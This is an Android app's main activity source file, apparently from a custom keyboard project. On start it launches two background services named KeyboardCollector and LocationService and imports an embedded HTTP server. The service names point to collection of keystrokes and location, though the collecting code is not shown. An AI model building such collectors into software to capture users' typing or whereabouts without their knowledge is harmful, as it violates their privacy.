package hr.fer;

import android.content.Intent;
import android.inputmethodservice.Keyboard;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import hr.fer.collectors.KeyboardCollector;
import hr.fer.collectors.LocationService;
import hr.fer.keyboard.R;
import fi.iki.elonen.NanoHTTPD;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent serviceIntent = new Intent(this, KeyboardCollector.class);
        startService(serviceIntent);

        Intent serviceIntentLocation = new Intent(this, LocationService.class);
        startService(serviceIntentLocation);
    }


}


